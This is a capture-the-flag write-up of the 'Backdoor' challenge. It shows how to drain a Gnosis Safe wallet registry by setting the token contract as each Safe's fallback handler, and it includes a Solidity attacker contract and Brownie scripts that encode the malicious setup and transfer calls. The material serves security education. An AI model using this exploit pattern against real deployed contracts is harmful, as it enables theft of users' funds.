## Backdoor

### Challenge description

> To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
>
> To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.
>
> Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
>
> Your goal is to take all funds from the registry. In a single transaction. 

### Solution

The Backdoor challenge tasks us with deploying a Gnosis Safe proxy for 4 users through a Gnosis Safe Proxy Factory. After each deployment, 10 DVT tokens will be distributed to each one of those users (the beneficiaries)

For the registry to accept each proxy creation as correct and to steal the tokens, we must code an attacker contract that makes the calls and passes a few conditions:

1. The WalletRegistry contract must have enough DVT tokens to make the payment to the beneficiary

```solidity
require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");
```

This does not directly depend on us, so we can continue.

2. The caller contract must be the GnosisSafeProxyFactory contract

```solidity
require(msg.sender == walletFactory, "Caller must be factory");
```

To achieve this, all we have to do is use the correct call when creating the proxy through the proxy factory contract. The call that invokes this function in the WalletRegistry (of course, specifying that this is the wallet registry that will receive the callback) is the function `createProxyWithCallback()`. This function takes the following parameters:

```solidity
function createProxyWithCallback(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce,
    IProxyCreationCallback callback
)
```

+ The `_singleton` address is the Gnosis Safe implementation contract address, which the WalletRegistry contract refers to as the `masterCopy`.
+ The `initializer` data, which is the data we will generate to call `setup()` (detailed on condition 3)
+ The `saltNonce` which we can just set as 0
+ The `callback`, which is the address to the WalletRegistry contract, but since it can only be passed as an IProxyCreationCallback interface, we must pass it as such `IProxyCreationCallback(registry)` by importing the interface at the top of the attacker contract

3. The right singleton contract must be used

```solidity
require(singleton == masterCopy, "Fake mastercopy used");
```

This is covered by using the address of `masterCopy` (the Gnosis Safe implementation contract) correctly when calling `createProxyWithCallback()`


4. We must be calling `setup()`

```solidity
require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");
```

`setup()` is the initializer function for a Gnosis Safe multisignature wallet. This function is in the Gnosis Safe implementation contract (GnosisSafe.sol) and it takes the following parameters:

```solidity
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
)
```

+ `_owners` must be an array with the addresses that will control this contract. Here we must input an array with a single element per multisig we initialize, one per user.
+ `_threshold` is the number of required confirmations per transaction signed by the safe. E.g. if `_threshold` is 4 and the size of `_owners` is 7, then at least 4 out of the 7 owner addresses must sign for a transaction to go through. In this case, this value must be 1.
+ `to` is a contract address to which an optional delegate call will be made, this can be set as the null address.
+ `data` payload for that optional delegate call. This can be 0.
+ **`fallbackHandler`** is the parameter which we will use to be able to exploit the wallets despite not being an owner of the wallet. This parameter is an address which will handle fallback calls to the contract, if we make a call that contains a function selector that does not match any function in the safe, then this selector and the calldata will be forwarded to a fallback contract which corresponds to the address of `fallbackHandler`. **Here we can input the DVT token contract address**.
+ `paymentToken` is the address of a token that can be optionally used to pay gas fees for transactions, we won't use gas tokens so this can be the null address as we want to use ETH to pay for txs.
+ `payment` is the value that should be payed in case a gas token is used. We'll use ETH, so this should be 0.
+ `paymentReceiver` is the address that will receive the payment. This should be the null address so that it's set to `tx.origin`.

5. The `_threshold` parameter in the `setup()` call needs to be 1.

```solidity
require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
```

As specified in 4.

6. The `_owners` array must be of length 1, so each multisig wallet must have at most 1 owner.

```solidity
require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");
```

As specified in 4.

7. The owner set per multisig must be in the list of beneficiaries.

```solidity
require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");
```

After all requirements pass, the DVT tokens will be transferred to the created Gnosis Safe multisig. Each multisig will receive 10 DVT tokens.

To steall all the tokens in one transaction, we must create a function in the attacker contract that will perform the following workflow:

1. Create the multisig for user `user`.
    + The creation will assign the `fallbackHandler` as the DVT token contract address
    + The creation will assign the `callback` proxy creation callback interface to the WalletFactory contract

2. Make a call to the newly created Gnosis Safe multisig for user `user` with function selector + calldata performing a token transfer. The function selector specified must be that of the `transfer()` function of the DVT token contract. The calldata should be the receiver of those tokens (the attacker address) and the amount should be the entire balance that the WalletRegistry will send to the newly created multisig (10 DVT tokens). This call will effectively transfer the 10 DVT tokens in that Safe to the attacker's address.

I decided to pass the calldata for the `setup()` and `transfer()` functions as a parameter to the function so that the contract is more readable:

```solidity
function deploySafesAndStealTokens(bytes[] calldata maliciousSetupCalls, bytes calldata maliciousTransferCall) external {
    // loop over the malicious calls, creating a new proxy per loop
    // which will allow us to then call transfer after the token contract
    // is set up as a fallback contract for the wallet
    for (uint256 i = 0; i < maliciousSetupCalls.length; i++) {
        GnosisSafeProxy newGnosisSafeWallet = gspf.createProxyWithCallback(
            singleton,
            maliciousSetupCalls[i],
            0,
            IProxyCreationCallback(registry)
        );
        
        // transfer tokens to tx.origin, the attacker
        (bool success,) = address(newGnosisSafeWallet).call(maliciousTransferCall);

        // make sure the transfer is made
        require(success, "tokens stealing failed");
    }
}
```

To generate the data for this calls I just used the `encode_input` method in Brownie:

+ `setup()` call

```py
# malicious calls list
malicious_setup_calls = []

# loop over addresses
for user in users: 

    # setup call encoding from master copy
    malicious_setup_calls.append(
        master_copy.setup.encode_input(
            [user],
            1,
            ZERO_ADDRESS,
            0,
            token.address,
            ZERO_ADDRESS,
            0,
            ZERO_ADDRESS
        )
    )
```

+ `transfer()` call

```py
token_stealing_call = token.transfer.encode_input(
    attacker.address, 
    AMOUNT_TOKENS_DISTRIBUTED // len(users)
)
```

And then just call the attacker contract function to do it all in one transaction:

```py
attacker_contract.deploySafesAndStealTokens(
    malicious_setup_calls, 
    token_stealing_call, 
    _fromAttacker
)
```
